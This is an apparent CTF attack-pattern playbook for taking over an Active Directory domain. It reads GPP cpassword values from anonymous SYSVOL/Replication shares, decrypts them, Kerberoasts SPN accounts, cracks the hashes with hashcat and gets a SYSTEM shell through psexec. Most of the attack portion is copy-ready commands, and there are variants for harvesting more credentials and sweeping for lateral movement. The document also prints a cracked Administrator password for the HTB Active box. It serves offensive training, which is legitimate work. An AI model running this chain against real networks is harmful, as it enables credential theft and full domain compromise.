# Attack Pattern — GPP cpassword → Kerberoast → Domain Admin

> The Active box pattern. Anonymous SMB → Groups.xml → cpassword →
> domain-user shell → Kerberoast Administrator → DA.

## Signature

```
nmap → AD detected
  → smbmap anonymous → Replication or SYSVOL share readable
       → recurse-download → Groups.xml found
            → gpp-decrypt → cleartext for service-account user
                 → cred validates as a domain user
                      → Kerberoast SPN-bearing accounts (impacket-GetUserSPNs -request)
                           → hashcat -m 13100 → crack the privileged account
                                → psexec / evil-winrm as that account
                                     → SYSTEM / DA → DCSync if desired
```

## When to suspect this template

- AD environment.
- Replication or SYSVOL share is anonymous-readable.
- Lockout policy isn't strict enough to prevent domain enumeration.

## Step-by-step

### 1. Anonymous SMB

```bash
smbmap -H <ip>
smbclient -L //<ip>/ -N
```

Look for `Replication`, `SYSVOL`, `Policies`, `NETLOGON`.

### 2. Download

```bash
smbclient //<ip>/Replication -N -c 'recurse ON; prompt OFF; mget *'
```

### 3. Find Groups.xml

```bash
find . -iname "Groups.xml" -o -iname "Services.xml" -o -iname "ScheduledTasks.xml"
```

Inspect:
```xml
<User name="<dom>\<user>" cpassword="<base64>" .../>
```

### 4. Decrypt

```bash
gpp-decrypt '<base64>'
# yields cleartext password
```

### 5. Validate

```bash
crackmapexec smb <ip> -u <user> -p '<pass>'
```

### 6. Kerberoast all SPNs

```bash
impacket-GetUserSPNs <dom>/<user>:<pass> -dc-ip <ip> -request \
  -outputfile kerberoast.hashes -format hashcat
```

### 7. Crack high-value account hash

Look in the output for accounts in privileged groups. The Active
twist is that **Administrator itself has an SPN** — gold:

```bash
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
# → Administrator : Ticketmaster1968
```

### 8. Authenticate

```bash
impacket-psexec <dom>/Administrator:'<pass>'@<ip>
# SYSTEM shell

# or
crackmapexec smb <ip> -u Administrator -p '<pass>'
# Pwn3d!
```

## Variants

### Variant A — The cracked account is *not* Administrator
- The Kerberoast cred maps to a service account.
- That account is local admin somewhere → CME sweep to find which host.
- Reuse cred there for SYSTEM, then DCSync if applicable.

### Variant B — Multiple GPP files
- `Services.xml` and `ScheduledTasks.xml` also carry cpassword.
- Decode every one — there's often more than one cred to harvest.

### Variant C — GPP password drops a non-AD admin
- The decoded user is a *local* admin on a member server, not a
  domain user.
- Use `--local-auth` for sweep.

## Real HTB Examples

- **Active** — full template; Administrator has SPN.
- Real-world: any organisation predating MS14-025 with un-cleaned-up
  GPOs leaks the same way.
- Variants on Mantis, Sizzle, and other older AD boxes.

## Why this works

The MS14-025 fix removed the ability to *create new* GPP password
fields, but **did not remove existing cpasswords from SYSVOL**.
Organisations that rolled out the patch often left old XML files
in place; AD CTF authors recreate that scenario.

## Anti-patterns

- Trying to brute-force the `cpassword` — the AES key is published.
- Treating the GPP user as just a service account — also kerberoast.
- Skipping Kerberoast because "Administrator never has an SPN" — they
  sometimes do, especially in small AD environments.

## Related Skills

- [`active-directory/anonymous-ad-enumeration.md`](../active-directory/anonymous-ad-enumeration.md)
- [`active-directory/gpp-cpassword.md`](../active-directory/gpp-cpassword.md)
- [`active-directory/kerberoasting.md`](../active-directory/kerberoasting.md)
- [`smb/anonymous-share-enumeration.md`](../smb/anonymous-share-enumeration.md)
- [`methodology/07-ad-attack-chains.md`](../methodology/07-ad-attack-chains.md)
